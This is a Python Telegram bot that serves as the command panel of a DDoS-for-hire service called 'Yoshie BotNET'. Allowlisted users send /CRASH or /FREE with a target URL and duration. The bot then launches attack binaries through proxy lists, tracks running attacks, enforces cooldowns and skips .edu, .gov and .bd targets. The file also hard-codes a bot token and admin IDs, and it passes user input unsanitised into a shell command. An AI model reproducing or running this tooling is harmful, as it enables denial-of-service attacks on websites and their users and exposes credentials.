import telebot
import subprocess
import datetime
import os
import threading
import time
import requests

# Insert your Telegram bot token here
bot_token = '7287302412:AAEdC2sQl_exFoNuadMIMRJtWshXqGAB7Os'
bot = telebot.TeleBot(bot_token)

# Admin user IDs
admin_ids = ["5089289298"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Dictionary to store running attacks
running_attacks = {}

# Dictionary to store cooldowns for /CRASH and /FREE commands
command_cooldowns = {
    "CRASH": {},
    "FREE": {}
}

# Blocked domains
blocked_domains = ['.edu', '.gov', '.bd']

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, command, target=None, port=None, time=None):
    with open(LOG_FILE, "a") as file:
        log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
        if target:
            log_entry += f" | Target: {target}"
        if port:
            log_entry += f" | Port: {port}"
        if time:
            log_entry += f" | Time: {time}"
        file.write(log_entry + "\n")

# Function to update attack countdowns
def update_countdown(message_id, chat_id, target, method, remaining_time):
    while remaining_time > 0:
        time.sleep(1)
        remaining_time -= 1
        try:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=f"Running Attack:\nMethod: {method}\nTarget: {target}\nRemaining Time: {remaining_time}s",
            )
        except:
            continue
    bot.edit_message_text(
        chat_id=chat_id,
        message_id=message_id,
        text=f"Attack finished:\nMethod: {method}\nTarget: {target}\nTime: {remaining_time}s",
    )
    del running_attacks[(chat_id, message_id)]

def send_message_with_retry(chat_id, text, retries=3, **kwargs):
    for i in range(retries):
        try:
            return bot.send_message(chat_id, text, **kwargs)
        except telebot.apihelper.ApiTelegramException as e:
            if e.error_code == 429:
                retry_after = int(e.result_json['parameters']['retry_after'])
                time.sleep(retry_after)
            else:
                raise e

def reply_to_with_retry(message, text, retries=3, **kwargs):
    for i in range(retries):
        try:
            return bot.reply_to(message, text, **kwargs)
        except telebot.apihelper.ApiTelegramException as e:
            if e.error_code == 429:
                retry_after = int(e.result_json['parameters']['retry_after'])
                time.sleep(retry_after)
            else:
                raise e

# Unified handler for /CRASH command
@bot.message_handler(commands=['CRASH'])
def handle_CRASH(message):
    user_id = str(message.chat.id)

    if user_id in allowed_user_ids:
        if user_id not in admin_ids:
            if user_id in command_cooldowns["CRASH"] and (datetime.datetime.now() - command_cooldowns["CRASH"][user_id]).seconds < 180:
                response = "You Are On Cooldown. Please Wait 180s Before Running The /CRASH Command Again."
                reply_to_with_retry(message, response)
                return
            command_cooldowns["CRASH"][user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:
            method = command[1]
            target = command[2]
            time_seconds = int(command[3])
            
            # Check for blocked domains
            if any(blocked_domain in target for blocked_domain in blocked_domains):
                response = "Error: Target domain is not allowed."
                reply_to_with_retry(message, response)
                return
            
            if time_seconds > 180:
                response = "Error: Time interval must be less than 181."
            else:
                log_command(user_id, '/CRASH', target, None, time_seconds)
                full_command = f"./CRASH {method} {target} {time_seconds} 132 20 proxy.txt"
                process = subprocess.Popen(full_command, shell=True)

                response = f"Attack started:\nMethod: {method}\nTarget: {target}\nTime: {time_seconds}s"
                sent_message = reply_to_with_retry(message, response)

                running_attacks[(message.chat.id, sent_message.message_id)] = {
                    "method": method,
                    "target": target,
                    "end_time": datetime.datetime.now() + datetime.timedelta(seconds=time_seconds)
                }

                threading.Thread(target=update_countdown, args=(sent_message.message_id, message.chat.id, target, method, time_seconds)).start()
        else:
            response = "Usage: /CRASH <METHOD> <URL> <TIME>\n𝖸𝔬𝔰𝔥𝔦𝔢 𝖡𝗈𝗍𝖭𝖤𝖳 METHODS ARE - TLS, DRAGON, BYPASS, XMIX, KILL, SKYNET"
    else:
        response = "You are not authorized to use this command.\n𝖸𝔬𝔰𝔥𝔦𝔢 𝖡𝗈𝗍𝖭𝖤𝖳"
    reply_to_with_retry(message, response)

# Handler for /FREE command
@bot.message_handler(commands=['FREE'])
def handle_FREE(message):
    user_id = str(message.chat.id)

    if message.chat.id != -1002201061172:
        response = "This command can only be used in @Yoshie_botnetChat."
        reply_to_with_retry(message, response)
        return

    if user_id in command_cooldowns["FREE"] and (datetime.datetime.now() - command_cooldowns["FREE"][user_id]).seconds < 30:
        response = "You Are On Cooldown. Please Wait 30s Before Running The /FREE Command Again."
        reply_to_with_retry(message, response)
        return

    command = message.text.split()
    if len(command) == 3:
        target = command[1]
        time_seconds = int(command[2])

        # Check for blocked domains
        if any(blocked_domain in target for blocked_domain in blocked_domains):
            response = "Error: Target domain is not allowed."
            reply_to_with_retry(message, response)
            return
        
        if time_seconds > 30:
            response = "Error: Time interval must be less than 31 seconds."
        elif len(running_attacks) >= 3:
            response = "Error: Maximum 3 concurrent attacks allowed."
        else:
            log_command(user_id, '/FREE', target, None, time_seconds)
            full_command = f"./FREE {target} {time_seconds} 64 15 proxy.txt"
            process = subprocess.Popen(full_command, shell=True)

            response = f"Free attack started:\nTarget: {target}\nTime: {time_seconds}s"
            sent_message = reply_to_with_retry(message, response)

            running_attacks[(message.chat.id, sent_message.message_id)] = {
                "method": "FREE-TLS",
                "target": target,
                "end_time": datetime.datetime.now() + datetime.timedelta(seconds=time_seconds)
            }

            command_cooldowns["FREE"][user_id] = datetime.datetime.now()
            threading.Thread(target=update_countdown, args=(sent_message.message_id, message.chat.id, target, "TLS", time_seconds)).start()
    else:
        response = "Usage: /FREE <URL> <TIME>\nDRAGON PANEL"
    reply_to_with_retry(message, response)

# Command handler for /running
@bot.message_handler(commands=['running'])
def show_running_attacks(message):
    user_id = str(message.chat.id)

    if user_id in admin_ids:
        if running_attacks:
            response = "Running Attacks:\n"
            for (chat_id, message_id), attack_info in running_attacks.items():
                remaining_time = (attack_info["end_time"] - datetime.datetime.now()).seconds
                response += f"Method: {attack_info['method']}\nTarget: {attack_info['target']}\nRemaining Time: {remaining_time}s\n\n"
        else:
            response = "No running attacks."
    else:
        response = "Only admins can run this command."
    reply_to_with_retry(message, response)

# Command handler for /add
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)

    if user_id in admin_ids:
        command = message.text.split()
        if len(command) > 1:
            new_user_id = command[1]
            if new_user_id not in allowed_user_ids:
                allowed_user_ids.append(new_user_id)
                with open(USER_FILE, "a") as file:
                    file.write(f"{new_user_id}\n")
                response = f"User {new_user_id} added successfully."
            else:
                response = "User is already in the list."
        else:
            response = "Please specify a user ID to add."
    else:
        response = "Only admins can run this command."
    reply_to_with_retry(message, response)

# Command handler for /remove
@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)

    if user_id in admin_ids:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user in allowed_user_ids:
                        file.write(f"{user}\n")
                response = f"User {user_to_remove} removed successfully."
            else:
                response = "User not found."
        else:
            response = "Please specify a user ID to remove."
    else:
        response = "Only admins can run this command."
    reply_to_with_retry(message, response)

# Command handler for /start
@bot.message_handler(commands=['start'])
def send_welcome(message):
    response = "Welcome to the Bot! Use /help to see available commands."
    reply_to_with_retry(message, response)

# Command handler for /help
@bot.message_handler(commands=['help'])
def send_help(message):
    response = (
        "Available Commands:\n"
        "/CRASH <METHOD> <URL> <TIME> - Run an attack (max time 180s, cooldown 180s)\n"
        "/FREE <URL> <TIME> - Run a free attack (only in selected chat, max time 30s, cooldown 30s)\n"
        "/running - Show running attacks (admin only)\n"
        "/add <USER_ID> - Add a user (admin only)\n"
        "/remove <USER_ID> - Remove a user (admin only)\n"
        "/start - Show welcome message\n"
        "/help - Show this help message"
    )
    reply_to_with_retry(message, response)

# Start the bot
bot.polling()
